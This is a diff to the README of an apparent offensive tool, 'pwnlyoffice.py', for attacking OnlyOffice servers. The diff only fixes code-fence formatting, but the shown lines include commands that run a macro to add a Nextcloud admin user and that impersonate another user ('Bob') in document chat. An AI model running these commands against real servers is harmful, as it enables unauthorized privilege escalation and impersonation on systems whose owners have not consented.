@@ -88,7 +88,7 @@ Get a list of valid document ids with `SELECT DISTINCT id FROM task_result`
 
 This macro adds an admin user into Nextcloud. The document id is `1234` and has to be known by the attacker. These vary depending on what the underlying document management system is.
 
-``bash
+```bash
 ./pwnlyoffice.py -d 1234 -u https://theonlyofficesiteurl macro macros/nextcloud_addadmin.js
 ```
 
@@ -96,6 +96,6 @@ This macro adds an admin user into Nextcloud. The document id is `1234` and has 
 
 Masquerading as a user called "Bob", connected to document id "1234"
 
-``bash
+```bash
 ./pwnlyoffice.py -d 1234 -u https://theonlyofficesiteurl -U Bob chat
 ```
